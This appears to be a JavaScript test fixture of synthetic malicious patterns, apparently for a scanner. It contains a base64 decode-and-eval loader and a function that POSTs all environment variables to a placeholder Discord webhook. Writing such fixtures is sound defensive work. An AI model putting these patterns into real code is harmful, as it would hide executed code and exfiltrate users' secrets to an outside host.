// Fixture content. Do not execute. Synthetic patterns matching Section B and D.
const PAYLOAD_B64 = 'Y29uc29sZS5sb2coImhlbGxvIik7';
const decoded = Buffer.from(PAYLOAD_B64, 'base64').toString();
eval(decoded);

async function report(data) {
  await fetch('https://discord.com/api/webhooks/000000000000000000/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', {
    method: 'POST',
    body: JSON.stringify({ env: process.env }),
  });
}
